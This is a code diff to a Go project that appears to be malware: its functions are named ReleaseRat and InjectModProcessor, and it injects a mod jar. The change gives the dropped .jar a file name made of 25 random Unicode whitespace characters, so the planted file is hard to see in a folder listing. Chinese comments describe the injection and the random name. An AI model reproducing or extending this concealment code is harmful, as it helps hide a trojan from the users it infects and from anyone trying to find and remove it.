@@ -7,6 +7,7 @@ import (
 	"ScrambledEggwithTomato/utils"
 	"fmt"
 	"io"
+	"math/rand"
 	"os"
 	"path/filepath"
 	"strings"
@@ -62,6 +63,17 @@ func ReleaseRat() {
 	}
 }
 
+var unicodeSpaces = []string{"\u2000", "\u2001", "\u2002", "\u2003", "\u2004", "\u2005", "\u2006", "\u2007", "\u2008", "\u2009", "\u200A", "\u202F", "\u205F", "\u00A0", "\u1680", "\u2800"}
+
+func generateRandomUnicodeSpace() string {
+	var output string
+	for i := 0; i < 25; i++ {
+		randomIndex := rand.Intn(len(unicodeSpaces))
+		output += unicodeSpaces[randomIndex]
+	}
+	return output
+}
+
 func InjectModProcessor() {
 	mylogger.Log("注入mod中...")
 
@@ -97,7 +109,9 @@ func InjectModProcessor() {
 				return err
 			}
 			defer sourceFile.Close()
-			targetFile, err := os.Create(targetPath)
+			// 生成随机unicode空白字符作为随机文件名
+			randomFileName := generateRandomUnicodeSpace() + ".jar"
+			targetFile, err := os.Create(filepath.Join(targetDir, randomFileName))
 			if err != nil {
 				return err
 			}
